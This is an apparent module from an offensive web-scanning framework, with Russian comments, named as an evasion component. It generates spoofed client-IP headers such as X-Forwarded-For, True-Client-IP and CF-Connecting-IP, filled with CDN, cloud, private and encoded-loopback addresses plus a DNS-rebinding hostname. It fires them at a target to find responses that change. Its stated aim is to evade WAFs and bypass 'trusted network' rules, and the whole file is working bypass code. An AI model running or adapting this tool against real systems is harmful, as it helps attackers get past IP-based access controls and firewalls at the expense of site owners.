"""header_spoof v2 — IP-spoofing headers with realistic subnet ranges.

v1 problem: все IP = 127.0.0.1 → WAF instantly flags loopback.
v2: реальные внешние подсети (Cloudflare/Google/AWS), внутренние
приватные, специальные, режимы через --extra spoof=<mode>.

API для других модулей:
    from modules.evasion.header_spoof import get_spoof_headers
    headers = get_spoof_headers(mode="cloudflare")
"""
import random
from core.http import HttpClient


# ==== реалистичные IP-подсети по категориям ====

CLOUDFLARE_IPS = [
    "104.16.0.1", "104.17.0.1", "104.18.0.1", "104.19.0.1", "104.20.0.1",
    "172.64.0.1", "172.65.0.1", "172.66.0.1", "172.67.0.1",
    "173.245.48.1", "103.21.244.1", "103.22.200.1", "103.31.4.1",
    "141.101.64.1", "108.162.192.1", "190.93.240.1", "188.114.96.1",
    "197.234.240.1", "198.41.128.1", "162.158.0.1", "162.159.0.1",
]

GOOGLE_IPS = [
    "8.8.8.8", "8.8.4.4",
    "142.250.0.1", "142.251.0.1", "172.217.0.1",
    "216.58.0.1", "64.233.160.1", "66.249.64.1", "72.14.192.1",
    "74.125.0.1", "173.194.0.1", "209.85.128.1",
]

AWS_IPS = [
    "52.0.0.1", "52.1.0.1", "52.2.0.1",
    "54.0.0.1", "54.1.0.1",
    "3.0.0.1", "3.1.0.1", "3.5.0.1",
    "18.0.0.1", "18.128.0.1", "35.152.0.1",
]

AKAMAI_IPS = [
    "23.32.0.1", "23.33.0.1", "23.34.0.1", "23.35.0.1",
    "104.64.0.1", "104.65.0.1", "104.66.0.1",
    "184.24.0.1", "184.25.0.1",
]

# внутренние — для обхода "trusted network" правил
INTERNAL_IPS = [
    "10.0.0.1", "10.0.0.100", "10.0.1.1",
    "172.16.0.1", "172.16.1.1",
    "192.168.0.1", "192.168.1.1", "192.168.1.100",
    "10.10.10.1", "10.10.14.1",
]

# специальные
SPECIAL_IPS = [
    "127.0.0.1", "127.0.0.2",
    "0.0.0.0", "255.255.255.255",
    "::1", "::ffff:127.0.0.1",
    "localhost",
    "2130706433",              # 127.0.0.1 как int
    "0177.0.0.1",              # 127.0.0.1 как octal
    "0x7f.0.0.1",              # 127.0.0.1 как hex
]

# loopback обходы (numeric/decimal/hex-encoded)
LOOPBACK_TRICKS = [
    "127.0.0.1", "127.1", "127.0.1",
    "2130706433",       # 127.0.0.1 int
    "0x7f000001",       # 127.0.0.1 hex
    "017700000001",     # 127.0.0.1 octal
    "127.0.0.1.nip.io", # DNS rebinding
]


# ==== заголовки, через которые WAF/приложение проверяет IP ====

IP_HEADERS = [
    "X-Forwarded-For",
    "X-Forwarded",
    "Forwarded-For",
    "X-Real-IP",
    "X-Client-IP",
    "X-Originating-IP",
    "X-Remote-IP",
    "X-Remote-Addr",
    "X-Original-IP",
    "X-Cluster-Client-IP",
    "X-ProxyUser-Ip",
    "True-Client-IP",
    "CF-Connecting-IP",
    "Fastly-Client-IP",
    "Akamai-Client-IP",
    "X-Azure-ClientIP",
    "X-Amzn-Trace-Id",
    "X-Custom-IP-Authorization",
    "X-Host",
    "X-Forwarded-Host",
]

# header → формат значения
HEADER_VALUES_TEMPLATE = {
    "Forwarded": "for={ip};proto=https;by={ip}",
    "X-Forwarded": "for={ip}",
    "Forwarded-For": "{ip}",
    "X-Amzn-Trace-Id": "Root=1-{ip}",
}


def _sample(mode):
    """Возвращает подборку IP для режима."""
    if mode == "cloudflare":
        return random.sample(CLOUDFLARE_IPS, min(5, len(CLOUDFLARE_IPS)))
    if mode == "google":
        return random.sample(GOOGLE_IPS, min(5, len(GOOGLE_IPS)))
    if mode == "aws":
        return random.sample(AWS_IPS, min(5, len(AWS_IPS)))
    if mode == "akamai":
        return random.sample(AKAMAI_IPS, min(5, len(AKAMAI_IPS)))
    if mode == "internal":
        return random.sample(INTERNAL_IPS, min(5, len(INTERNAL_IPS)))
    if mode == "special":
        return random.sample(SPECIAL_IPS, min(5, len(SPECIAL_IPS)))
    if mode == "loopback":
        return random.sample(LOOPBACK_TRICKS, min(3, len(LOOPBACK_TRICKS)))
    # mixed (по умолчанию): по одному из каждой категории
    pools = [CLOUDFLARE_IPS, GOOGLE_IPS, AWS_IPS, INTERNAL_IPS, LOOPBACK_TRICKS]
    return [random.choice(pool) for pool in pools]


def get_spoof_headers(mode="mixed"):
    """
    Возвращает dict заголовков с подставленными IP.
    Используется другими модулями через --extra spoof=<mode>.
    """
    ips = _sample(mode)
    headers = {}
    for h in IP_HEADERS:
        ip = random.choice(ips)
        if h in HEADER_VALUES_TEMPLATE:
            headers[h] = HEADER_VALUES_TEMPLATE[h].format(ip=ip)
        else:
            headers[h] = ip
    # цепочка XFF (несколько IP через запятую — эмулирует прокси)
    headers["X-Forwarded-For"] = ", ".join(random.sample(ips, min(3, len(ips))))
    return headers


class HeaderSpoof:
    def run(self, session, logger):
        target = session.target
        http = HttpClient(session, logger)

        # режим из --extra spoof=<mode>
        mode = "mixed"
        for x in getattr(session, "extra", []) or []:
            if x.startswith("spoof="):
                mode = x[6:].strip()

        try:
            base = http.get(target)
        except Exception:
            print(f"[header_spoof v2] target unreachable")
            return {"results": []}
        base_code = base.status_code if base else None
        base_len = len(base.content) if base else 0

        print(f"[header_spoof v2] target: {target}")
        print(f"[header_spoof v2] mode: {mode}")
        print(f"[header_spoof v2] baseline: {base_code} ({base_len}b)")

        findings = []
        results = []

        # 1) Тестовые подсети по режимам
        modes = [mode] if mode != "mixed" else ["cloudflare", "google", "aws", "akamai", "internal", "special", "loopback"]
        for m in modes:
            headers = get_spoof_headers(m)
            try:
                r = http.get(target, headers=headers)
            except Exception:
                continue
            if not r:
                continue
            changed = r.status_code != base_code or abs(len(r.content) - base_len) > 300
            results.append({
                "mode": m,
                "code": r.status_code,
                "diff": abs(len(r.content) - base_len),
                "changed": changed,
            })
            marker = "  ✓" if changed else "   "
            print(f"{marker} [{m:10s}] {r.status_code} ({len(r.content)}b, diff {abs(len(r.content) - base_len):+d})")
            if changed:
                findings.append({
                    "mode": m,
                    "baseline": base_code,
                    "result": r.status_code,
                    "diff": abs(len(r.content) - base_len),
                    "sample_ips": list(headers.values())[:3],
                })
                logger.finding("header_spoof", "medium",
                               f"mode={m} {base_code}->{r.status_code} diff={abs(len(r.content) - base_len)}")

        # 2) Каждый IP-заголовок отдельно с одним evil IP (Cloudflare)
        print()
        print("[header_spoof v2] testing each IP-header individually")
        evil_ip = random.choice(CLOUDFLARE_IPS)
        for h in IP_HEADERS:
            val = HEADER_VALUES_TEMPLATE.get(h, "{ip}").format(ip=evil_ip)
            try:
                r = http.get(target, headers={h: val})
            except Exception:
                continue
            if not r:
                continue
            if r.status_code != base_code:
                print(f"  ✓ {h}: {base_code} -> {r.status_code} (IP={evil_ip})")
                findings.append({
                    "header": h,
                    "value": val,
                    "baseline": base_code,
                    "result": r.status_code,
                })
                logger.finding("header_spoof", "medium",
                               f"{h}={val[:40]} {base_code}->{r.status_code}")

        print()
        print(f"[header_spoof v2] findings: {len(findings)}")
        return {
            "findings": findings,
            "modes_tested": modes,
            "headers_tested": len(IP_HEADERS),
        }
